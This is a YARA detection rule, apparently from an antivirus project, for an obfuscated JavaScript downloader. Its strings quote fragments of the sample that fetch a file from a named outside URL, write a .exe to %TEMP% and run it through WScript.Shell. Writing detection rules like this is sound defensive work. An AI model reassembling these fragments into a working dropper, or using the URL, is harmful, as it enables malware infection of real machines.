rule sig_20160401_950e7fc799cc217c6abcd48480582a45 {
  meta:
    description = "datamaliciousorder - file 20160401_950e7fc799cc217c6abcd48480582a45.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8e721f25fbbb36dd3154f6b48330fe20919ee86be3b126049e751a575204d62e"

  strings:
    $s1  = "PzUna[CemKev](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "var PrKn = function FqIgg() {return WScript[XpeWf](\"WScript\"+\".Shell\");}(), ReLv = 11;" fullword ascii
    $s3  = "function ZyJe(ZpsTjm, MxMgj){WuTz = WuTz * 1; return ZpsTjm - MxMgj;};" fullword ascii
    $s4  = "if (PzUna[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DpwHpf() {return PrKn[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"JyjQD45rtq6U.ex\" + \"e\";};" fullword ascii
    $s6  = "function MbWe(){return LwOcw + \"\";};" fullword ascii
    $s7  = "function MauWw() {return ((CvHt == true) && (CvHt == OarBt)) ? 1 : WuTz;};" fullword ascii
    $s8  = "var CvHt = false;" fullword ascii
    $s9  = "OarBt = true; " fullword ascii
    $s10 = "var QunLzo = new this[\"Date\"]();" fullword ascii
    $s11 = "function KdOr(){return 23;};" fullword ascii
    $s12 = "var OarBt = false;" fullword ascii
    $s13 = "function QhiFhq(NgfTrw) {var VucVna = (1, 2, 3, 4, 5, NgfTrw); return VucVna;};" fullword ascii
    $s14 = "function NraOx(){return XpeWf;};" fullword ascii
    $s15 = "}while (XlDt);" fullword ascii
    $s16 = "function OttWce(DsRyy){PrKn[\"R\"+\"un\"](DsRyy, WuTz, WuTz);};" fullword ascii
    $s17 = "function HjZx()" fullword ascii
    $s18 = "return ZyJe(HrdLkl, KgeOm);" fullword ascii
    $s19 = "CvHt = true; " fullword ascii
    $s20 = "var FsoBm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}